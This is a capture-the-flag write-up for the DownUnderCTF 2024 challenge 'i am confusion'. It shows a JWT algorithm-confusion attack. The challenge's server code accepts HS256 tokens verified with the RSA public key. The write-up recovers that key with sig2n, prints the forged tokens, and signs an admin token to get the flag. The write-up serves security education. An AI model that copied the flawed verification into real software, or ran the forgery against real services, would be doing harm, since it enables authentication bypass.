# i am confusion

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 113 solves / 166 points
- Author: @richighimi
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

The evil hex bug has taken over our administrative interface of our application. It seems that the secret we used to protect our authentication was very easy to guess. We need to get it back!

Author: richighimi

[https://i-am-confusion.2024.ductf.dev:30001](https://i-am-confusion.2024.ductf.dev:30001)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709150645.png)

When we go to `/`, it redirected us to `/login.html`, which means we need to be authenticated.

However, there's an unusual note:

> I have your application under control Emu. How silly of you to use such an easy hardcoded secret. I have now added support to use a key pair so that only I can control the admin panel. GG. - Love, Hex Bug

Hmm... Looks like someone already compromised the web server?

Anyway, let's try to login to an account that doesn't exist for testing:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709151012.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709151031.png)

When we logged in, it'll redirect us to `/public.html`. In here, we can read our profile and messages, but it's empty right now.

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709151224.png)

When we clicked the "Login" button, it'll send a POST request to `/login` with parameter `username` and `password`. Upon successful login, a JWT (JSON Web Token) will be signed and set a new cookie called `auth` for us.

Why I knew it's JWT? Well, JWT consists of 3 parts, which are header, payload, and signature. Each of them are separated by a `.` character. Also, the first 2 parts start with `ey`, which means it's base64 encoded `{` character.

We can decode the JWT and see what it is:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709151806.png)

> Note: I'm using the Burp Suite extension. You can also base64 decode the first 2 parts.

First, in the header part, the `alg` claim's value is **`RS256`**, which means the web application uses **RSA and SHA256 to sign and verify our JWT**.

Then, in the payload part, the `user` claim's value is our username.

> Note: The reason why the requests were highlighted in color is because of my Burp Suite extension "JSON Web Tokens".

In `/public.html`, we can also see that there's an interesting button called "Switch to Admin":

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709152151.png)

Let's click it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709152212.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709152226.png)

Hmm... It respond us with an ASCII art and HTTP status code "403 Forbidden"?

Now, let's read this web application source code and figure out why this is happening.

**In this challenge, we can download 2 files, [`package.json`](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/i-am-confusion/package.json) and [`server.js`](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/i-am-confusion/server.js):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/i-am-confusion)-[2024.07.09|15:23:40(HKT)]
└> file *      
package.json: JSON text data
server.js:    JavaScript source, ASCII text
```

In `server.js`, we can find something's off:

First, in the POST route `/login`, **we can't login as `admin` user** because of the regular expression check:

```javascript
const express = require('express')
const app = express()
[...]
app.post('/login', (req,res) => {
  var username = req.body.username
  var password = req.body.password

  if (/^admin$/i.test(username)) {
    res.status(400).send("Username taken");
    return;
  }
  [...]
});
```

Second, the JWT verification process is weird:

```javascript
[...]
const jwt = require('jsonwebtoken')
const cookieParser = require('cookie-parser')
var fs = require('fs')
[...]
// algs
const verifyAlg = { algorithms: ['HS256','RS256'] }
const signAlg = { algorithm:'RS256' }

// keys
// change these back once confirmed working
const privateKey = fs.readFileSync('keys/priv.key')
const publicKey = fs.readFileSync('keys/pubkeyrsa.pem')
const certificate = fs.readFileSync('keys/fullchain.pem')
[...]
app.get('/admin.html', (req, res) => {
  var cookie = req.cookies;
  jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
    if (err) {
      res.status(403).send("403 -.-");
    } else if (decoded_jwt['user'] == 'admin') {
      res.sendFile(path.join(__dirname, 'admin.html')) // flag!
    } else {
      res.status(403).sendFile(path.join(__dirname, '/public/hehe.html'))
    }
  })
})
```

In route `/admin.html`, if our verified **JWT payload `user` claim is `admin`**, we can get the flag.

So, our objective is to somehow forge our JWT payload `user` claim to be `admin`.

However, the **verify algorithm accepts both RS256 and HS256 (HMAC and SHA256)**??

Since the web application didn't implement both RS256 and HS256 verify algorithm, the application **verifies our JWT HS256 algorithm with an empty secret**.

Remember, RS256 is an asymmetric algorithm, while HS256 is symmetric algorithm. That being said, **RS256 requires a public and private key pair** to verify and sign our JWT, **HS256 only requires a secret key** to verify and sign our JWT.

Hence, this web application is vulnerable to **JWT algorithm confusion**.

In our case, if the web application receives a token signed using a symmetric algorithm like HS256, the [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) library's ***[`verify()` method](https://www.npmjs.com/package/jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback) will treat the public key as the secret key***. This means that **we could sign the token using HS256 and the public key, and the application will use the same public key to verify the signature**.

But wait, how can we get the public RSA key?

Luckily, this web application's SSL certificate's public and private key pair is same as the JWT signing and verify one!

```javascript
// keys
// change these back once confirmed working
const privateKey = fs.readFileSync('keys/priv.key')
const publicKey = fs.readFileSync('keys/pubkeyrsa.pem')
const certificate = fs.readFileSync('keys/fullchain.pem')
[...]
const credentials = {key: privateKey, cert: certificate}
const httpsServer = https.createServer(credentials, app)
const PORT = 1337;

httpsServer.listen(PORT, ()=> {
  console.log(`HTTPS Server running on port ${PORT}`);
})
```

**Hence, we can get the certificate via this command:**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/i-am-confusion)-[2024.07.09|15:55:55(HKT)]
└> openssl s_client -connect i-am-confusion.2024.ductf.dev:30001 </dev/null 2>/dev/null | openssl x509 -inform pem -text
[...]
-----BEGIN CERTIFICATE-----
MIIFCjCCA/KgAwIBAgISAy/oVvF2ILJQ+davzA0SCwxIMA0GCSqGSIb3DQEBCwUA
[...]
```

## Exploitation

Moreover, we can get the public RSA key in another way.

To do so, we can mathematically calculates one or more potential values of RSA's `n` via a tool called [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n).

**More conveniently, PortSwigger already prepared a Docker image for us to use this tool:**
```bash
docker run --rm -it portswigger/sig2n <token1> <token2> 
```

To use this tool, we'll first get 2 JWTs. We can do that by just logging in:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709160709.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709160728.png)

```
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/i-am-confusion)-[2024.07.09|16:07:33(HKT)]
└> docker run --rm -it portswigger/sig2n 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYW55dGhpbmciLCJpYXQiOjE3MjA1MTA1MDF9.LBTuIu_R9_WkMOrWxdnbuZ3Zc6jK8ON69KEyOMqL536S-sRaLuRhk4d9H4eLMLGusoRKVkk5q32jXSCX4z7cmVJj3Zr6BXBx4s3M_BHXhQCoVRgZec7-LusiWAx-_o82bZKde45nzKwZJSy_lyCcze0Wyx8hHtQeKqL6DqYJYAjgqCd9_IFmShT1ZORmpn8y0kJ9gt__b2mApiEjuGCDCiDUjZ5mGlAwc2cZpEbfb0Wunk4nSyqJERyguIwZtflXGm8dP8ACYrZTVQwrOGc9CuGS44x8w1QrsZ2eqnHQE7PeTYLWaX8ftGuv25p4QeayAga5qDDwOq0zYFYi2VyOLA' 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYW55dGhpbmcxIiwiaWF0IjoxNzIwNTEyNDM5fQ.ARTbUf03O2BnikymXkO6xo3sd528P7BovAVeDGUYI6t1680PRxY8QROwyIIW6KoQbKLaDLaz7l96CWZMb08rJLBt4HAUtbxbowcwiSgy95cFPuDp7O5KMa2vCmB_AJvSTtn6aORfNzC8PfaBQHqc81Q7ffgLkjrGrzTZsIg2FJ8tOVtLHuzP4eSr5TSPNRcIYsvoAdU21ZRBOwbhbckyxjLOGp157w_IsM2DlzSZ9pKVwQj7ILxKa9D-iFP-mn9-H27_chRF9YVqJUB61UbXG64sBIaUD9aN-Rf2TX1qTpWfQlJ2jtWI-CK1NyMQ8XgHg-RuT6v09QjyKBSV8wylYw'
[...]
Status: Downloaded newer image for portswigger/sig2n:latest
Running command: python3 jwt_forgery.py <token1> <token2>
[...]
Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUd6bDRRRUU4bzNIYlc1T1FCVlJiMQo3aEVKQnBISUpzbHdPR2gySkdialc4bjZRcXBnSFlZcDJnSmNTUTdjRGdBTXE1R2JnV3pDMU02WFBMZnhQQ1EwCm1MU0hNVEhRelVzU0tCVE8vUzlabWFnKzB5Zk1LWWpiUUVBMmQ5NzNMdU5CVkVqaFgvbGpvTFEzR25xSS93bmsKQ3AvQnFCNTdKdGVRQ054SkVUY2o0QzJadkRDZWRXMU45cVFhaGtCUkFCTHNSaTc2bWFRTjAxU25IME1weUIrWQpkZmZlM1QvdkZ6TmZIYVBYR0ZuaFhodU16eHdOaWkvMmxqK0hDNytNL1JtZm5RSmdwUzAycTQ5WVloaTZUM0dqCnhiZUFETmVDcjN4QlQxNkhYZ3FFTk9mQ2pBTTluY1ZobnJoQkx0eU1GU01xdkh3bTVYVVAyY1M2T3BjMXhaMWwKM2dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFueXRoaW5nIiwgImlhdCI6IDE3MjA1MTA1MDEsICJleHAiOiAxNzIwNTk4OTM4fQ.xifQNlbC9wxcDZq3xO1r3L6HojwZzIV3-oQ4IoRNBGo
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFR3psNFFFRThvM0hiVzVPUUJWUmIxN2hFSkJwSElKc2x3T0doMkpHYmpXOG42UXFwZ0hZWXAKMmdKY1NRN2NEZ0FNcTVHYmdXekMxTTZYUExmeFBDUTBtTFNITVRIUXpVc1NLQlRPL1M5Wm1hZysweWZNS1lqYgpRRUEyZDk3M0x1TkJWRWpoWC9sam9MUTNHbnFJL3dua0NwL0JxQjU3SnRlUUNOeEpFVGNqNEMyWnZEQ2VkVzFOCjlxUWFoa0JSQUJMc1JpNzZtYVFOMDFTbkgwTXB5QitZZGZmZTNUL3ZGek5mSGFQWEdGbmhYaHVNenh3TmlpLzIKbGorSEM3K00vUm1mblFKZ3BTMDJxNDlZWWhpNlQzR2p4YmVBRE5lQ3IzeEJUMTZIWGdxRU5PZkNqQU05bmNWaApucmhCTHR5TUZTTXF2SHdtNVhVUDJjUzZPcGMxeFoxbDNnSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFueXRoaW5nIiwgImlhdCI6IDE3MjA1MTA1MDEsICJleHAiOiAxNzIwNTk4OTM4fQ.veT_DOtovuoqCQu2TiT-Jn_iYv8S63PEdXzPXxlnmro

Found n with multiplier 2:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRURaeThJQ0NlVWJqdHJjbklBcW90Ngo5d2lFZzBqa0UyUzRIRFE3RWpOeHJlVDlJVlV3RHNNVTdRRXVKSWR1QndBR1Zjak53TFpoYW1kTG5sdjRuaElhClRGcERtSmpvWnFXSkZBcG5mcGVzek5RZmFaUG1GTVJ0b0NBYk8rOTdsM0dncWlSd3IveXgwRm9ialQxRWY0VHkKQlUvZzFBODlrMnZJQkc0a2lKdVI4QmJNM2hoUE9yYW0rMUlOUXlBb2dBbDJJeGQ5VE5JRzZhcFRqNkdVNUEvTQpPdnZ2YnAvM2k1bXZqdEhyakN6d3J3M0daNDRHeFJmN1N4L0RoZC9HZm96UHpvRXdVcGFiVmNlc01ReGRKN2pSCjR0dkFCbXZCVjc0Z3A2OURyd1ZDR25QaFJnR2V6dUt3ejF3Z2wyNUdDcEdWWGo0VGNycUg3T0pkSFV1YTRzNnkKN3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFueXRoaW5nIiwgImlhdCI6IDE3MjA1MTA1MDEsICJleHAiOiAxNzIwNTk4OTM4fQ.2M_lNpUtIBzHwd2uksZxlq3vIVisVMOreoUqQZMPp_8
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFRFp5OElDQ2VVYmp0cmNuSUFxb3Q2OXdpRWcwamtFMlM0SERRN0VqTnhyZVQ5SVZVd0RzTVUKN1FFdUpJZHVCd0FHVmNqTndMWmhhbWRMbmx2NG5oSWFURnBEbUpqb1pxV0pGQXBuZnBlc3pOUWZhWlBtRk1SdApvQ0FiTys5N2wzR2dxaVJ3ci95eDBGb2JqVDFFZjRUeUJVL2cxQTg5azJ2SUJHNGtpSnVSOEJiTTNoaFBPcmFtCisxSU5ReUFvZ0FsMkl4ZDlUTklHNmFwVGo2R1U1QS9NT3Z2dmJwLzNpNW12anRIcmpDendydzNHWjQ0R3hSZjcKU3gvRGhkL0dmb3pQem9Fd1VwYWJWY2VzTVF4ZEo3alI0dHZBQm12QlY3NGdwNjlEcndWQ0duUGhSZ0dlenVLdwp6MXdnbDI1R0NwR1ZYajRUY3JxSDdPSmRIVXVhNHM2eTd3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFueXRoaW5nIiwgImlhdCI6IDE3MjA1MTA1MDEsICJleHAiOiAxNzIwNTk4OTM4fQ.NazB_INkNGm_Ha4eSCTOBHDsFZcQwKXxfaz0TknQDm8
[...]
```

In the above output, **only one** of these matches the value of `n` used by the server's key. For each potential value, the script outputs:

- A Base64-encoded PEM key in both X.509 and PKCS1 format.
- A forged JWT signed using each of these keys.

To identify the correct key, we can use Burp Suite's Repeater to send a request containing each of the forged JWTs. Only one of these will be accepted by the server. After that, we can use the matching key to construct an algorithm confusion attack.

After trying different forged JWTs, most of them returned HTTP status code "403 Forbidden", which means the web application occurred an exception during verifing. However, only this one worked:
```shell
Found n with multiplier 10:
    [...]
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXJqeWJOTlMzU1Q4VmZVb0FJaHZsWkp0TnM5dGcwSzIrYkFweU50Y1d2R0QvYlJFSm5JMXEKbGMwSk9vRjhaOHpPRVNncEpvcmdTSHNQSDZ2K2hnT2UzQklOaE90aHJpRWJhbWg3R1ZHSTljUUdTRkRIbmNEaQp1YUFGY21NWXQrT0dpRzJ3SXpLSjluaHI2UXhBNWszS0FRLzV4QU1NVUs4b0FPTFVHMUpRWXpmQ2t0R3BjaVNICnk5MDEyam1oc3pVWG9KNU1RcEJueUZWRDZZYTNZTS8xcFdXV1NWTXhnbEh2NlYwdkhBajg3OCtPRkxZQldwNWwKZFd6QXRGLzBmN1hES1UwSnFoNGZFU2Z2UFFKNUIvSERrOFdNemhXTkVZeHM3bFpBdkpxbTBoY3REZ0JTOWkxVwpqOTg1dCtMYXp1bnFySExRc0l1MHlQb1NuM1dGWUkrOVl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFueXRoaW5nIiwgImlhdCI6IDE3MjA1MTA1MDEsICJleHAiOiAxNzIwNTk4OTM4fQ.Mw6ydq1m7MJfKSh7RzGFbYgg7TGvofehoLcR2nph4e8
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709161509.png)

As you can see, the web application uses [PKCS1](https://en.wikipedia.org/wiki/PKCS_1) format for the RSA public and private key pair, and the public key `n` multiplier is `10`.

With that said, we can now forge our own JWT!

- Using Burp Suite extension "JWT Editor" to create a new symmetric key

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162034.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162047.png)

- Replace the generated value for the `k` parameter with the base64 encoded PKCS1 key, and save it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162153.png)

- Modify our JWT:

Once we have the public key in a suitable format, you can [modify the JWT](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#editing-the-contents-of-jwts) however you like. Just make sure that the `alg` header is set to `HS256`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162414.png)

Finally, at the bottom of the tab, click "Sign", then select the symmetric key that we generated in the previous step:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162518.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162539.png)

Nice! We get the flag!

- **Flag: `DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}`**

## Conclusion

What we've learned:

1. JSON Web Token (JWT) algorithm confusion